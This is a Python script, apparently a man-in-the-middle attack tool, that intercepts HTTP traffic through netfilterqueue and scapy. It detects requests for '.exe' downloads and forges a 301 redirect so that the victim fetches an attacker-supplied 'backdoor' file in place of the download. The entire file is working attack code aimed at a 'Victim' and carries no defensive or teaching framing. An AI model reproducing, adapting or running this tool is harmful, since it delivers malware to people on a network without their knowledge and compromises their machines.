#!/usr/bin/env python
import netfilterqueue as netq
import scapy.all as scapy
import optparse
import argparse

def get_args():
    try:
        parser = optparse.OptionParser()
        parser.add_option("-l", "--link", dest="mal_link", help="Download link of the malicious file.")
        parser.add_option("-f", "--file", dest="filen", help="Name of the malicious file")
        (val, args) = parser.parse_args()
    except:
        parser = argparse.ArgumentParser()
        parser.add_argument("-l", "--link", dest="mal_link", help="Download link of the malicious file.")
        parser.add_argument("-f", "--file", dest="filen", help="Name of the malicious file")
        val = parser.parse_args()
    if not val.mal_link:
        parser.error("ERROR Missing argument, use --help for more info")
    return val
def mod_packet(packet, link):
    packet[scapy.Raw].load = " HTTP/1.1 301 Moved Permanently\nLocation: " + link + "\n\n"
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

req_ack = []
def work_packet(packet):
    use_packet = scapy.IP(packet.get_payload())
    if use_packet.haslayer(scapy.Raw):
        if use_packet[scapy.TCP].dport == 80:
            if ".exe" in use_packet[scapy.Raw].load and value.filen not in use_packet[scapy.Raw].load:
                print("[+] Detected Download .exe file REQUEST...")
                req_ack.append(use_packet[scapy.TCP].ack)
        elif use_packet[scapy.TCP].sport == 80:
            if use_packet[scapy.TCP].seq in req_ack:
                print("[+] HTTP Response for the Download Req...#########")
                req_ack.remove(use_packet[scapy.TCP].seq)
                print("[+] Replacing Download with backdoor...")
                modified_packet = mod_packet(use_packet, value.mal_link)
                packet.set_payload(str(modified_packet))
    packet.accept()

value = get_args()
queue = netq.NetfilterQueue()
queue.bind(0, work_packet)
try:
    queue.run()
except KeyboardInterrupt:
    print("[-] Detected CTRL + C Quitting...")
    print("[+] Download file replaced successfully for all downloads madeby Victim.")
